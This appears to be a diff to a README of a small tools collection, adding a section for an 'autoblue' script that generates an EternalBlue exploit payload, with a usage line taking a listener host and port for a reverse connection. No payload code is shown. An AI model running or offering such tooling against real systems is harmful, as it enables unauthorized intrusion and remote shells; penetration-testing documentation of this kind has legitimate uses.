@@ -20,3 +20,8 @@ For multiple matching group use:
 $ echo test123abc456def | ./msed "test(.*)abc(.*)def" 2
 456
 ```
+
+## autoblue
+Generate payload to exploit EternalBlue in x86 by default. Add the option `-x64` to have the 64 bits version.
+
+Usage: `./autoblue.sh -lhost YOUR_IP -lport LISTENING_PORT`
